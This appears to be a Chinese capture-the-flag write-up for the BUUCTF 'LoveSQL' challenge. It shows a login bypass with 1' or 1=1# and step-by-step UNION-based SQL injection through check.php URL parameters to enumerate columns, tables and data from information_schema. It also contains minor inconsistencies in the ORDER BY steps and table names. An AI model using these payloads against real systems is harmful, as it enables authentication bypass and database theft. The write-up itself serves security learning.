11-buu练习lovesql

打开题目链接。界面如下；

尝试使用万能密码：

  • 用户名：1' or 1=1#
  • 密码：222（任意三个数）
跳转到check.php界面：

得到了用户名和密码
开始注入
在url中输入；

  • 1./check.php?username=admin' order by 3%23&password=1 存在
  • 2./check.php?username=admin' order by 4%23&password=1 存在
  • 3./check.php?username=admin' order by 3%23&password=1 存在
  • 4./check.php?username=admin' order by 4%23&password=1 报错
注意：由于是在url中输入的内容，所以不能用#，而用它的url编码%23。 输入4时界面如下：

由此可知，有3个字段。用union查询测试注入点（回显点位）：

  • /check.php?username=1' union select 1,2,3%23&password=1

回显点位是2和3，查询数据库名及版本：

  • /check.php?username=1' union select 1,database(),version()%23&password=1
可知用户名为：geek 接下来爆表：
  • /check.php?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1

爆出geekyser和l0ve1ysq1两个表，我们试一下geekuser这个表：
爆字段：

  • /check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='geekuser'%23&password=1

得到三个字段：id，username，password。
爆数据：

  • /check.php?username=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&password=1

得到flag！
